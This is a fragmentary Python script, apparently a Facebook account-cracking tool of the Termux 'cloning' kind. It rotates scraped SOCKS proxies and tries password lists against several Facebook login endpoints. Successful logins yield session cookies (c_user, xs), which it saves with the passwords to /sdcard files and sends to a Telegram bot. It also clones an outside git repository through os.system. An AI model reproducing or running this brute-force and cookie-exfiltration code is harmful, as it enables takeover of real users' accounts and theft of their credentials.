...
import json,os,sys,random,datetime,time,re,platform,string,uuid,base64
...
redmi=[]
try:
 uno = httpx.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
...
try:
  proxylist= httpx.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
...
class Process:
    def __init__(self):
        self.cc=[]
        self.key="ATOM-"+"SECURITY-KEY-"+base64.b16encode(str(os.getuid()).encode()).decode()+hashlib.md5((platform.version() + str(os.getuid()) + platform.platform() + os.getlogin() + platform.release()).replace(' ', '').encode()).hexdigest()
        #self.key=""
        self.clear()
...
def cr():
	...
	os.system("cd && git clone https://github.com/smiletermuxworld/MR-SMILE")
...
"x-fb-server-cluster": "True"}
            q = session.post(f"https://b-graph.facebook.com/auth/login", headers=respons, data=date).json()
...
def m2(idf,pwv):
 ...
 for pw in pwv:
  try:
   ...
   dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(p.text)).group(1),"li":re.search('name="li" value="(.*?)"', str(p.text)).group(1),"try_number":"0","unrecognized_tries":"0","email":idf,"pass":pw,"login":"Log In"}
   koki = (";").join([ "%s=%s" % (key, value) for key, value in dict(ses.cookies).items()])
   ...
   log_cookies=dict(ses.cookies).items()
   if 'c_user' in log_cookies:
           coki=";".join([key+"="+value for key,value in dict(ses.cookies).items()])
           ...
           if 'live' in reqx:
                    ...
                    httpx.get(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
           ...
           coki=";".join([key+"="+value for key,value in dict(session.cookies).items()])
...
def m3(idf,pwv):
  ...
  for pw in pwv:
    try:
      ...
      po = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,proxies=proxs)
      if "checkpoint" in dict(ses.cookies).items():
        idf = dict(ses.cookies).items()["checkpoint"].split("%")[4].replace("3A", "")
        if 'y' in cp_xdx:
         print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
        open(' /sdcard/ULTRA-GREEN-CP.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        cp+=1
        break
      elif "c_user" in dict(ses.cookies).items():
        ok+=1
        coki=dict(ses.cookies).items()
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in dict(ses.cookies).items()])
...
def m4(idf,pwv):
 ...
 try:
  for ps in pwv:
   session = httpx.Client()
   ua = random.choice(usragent)
   free_fb = session.get('https://lm.facebook.com/login.php').text
   ...
   lo = session.post('https://mbasic.beta.facebook.com/login.php?skip_api_login=1&api_key=597615686992125&kid_directed_site=0&app_id=597615686992125&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D597615686992125%26cbt%3D1719168552634%26e2e%3D%257B%2522init%2522%253A1719168552634%257D%26ies%3D0%26sdk%3Dandroid-13.1.0%26sso%3Dchrome_custom_tab%26nonce%3D6c82e3a5-ea38-4bb7-af35-3db4f07a2759%26scope%3Dopenid%252Cpublic_profile%252C%2Buser_age_range%252C%2Bemail%252C%2Buser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25223c0209cc-8a60-4e83-acea-805004bdbc3f%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25225ue364d82kciv73mgjl6%2522%257D%26code_challenge_method%3DS256%26default_audience',data=log_data,headers=header_freefb).text
   log_cookies=dict(session.cookies).items()
   if 'c_user' in log_cookies:
    coki=";".join([key+"="+value for key,value in dict(session.cookies).items()])
    user = re.findall('c_user=(.*);xs', coki)[0]
 ...
 try:
  for ps in pwv:
   ...
   header_freefb = {
    ...
    'Pragma': 'no-cache',
    'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
   lo = session.post('https://mbasic.beta.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
   log_cookies=dict(session.cookies).items()
   if 'c_user' in log_cookies:
    coki=";".join([key+"="+value for key,value in dict(session.cookies).items()])
    user = re.findall('c_user=(.*);xs', coki)[0]
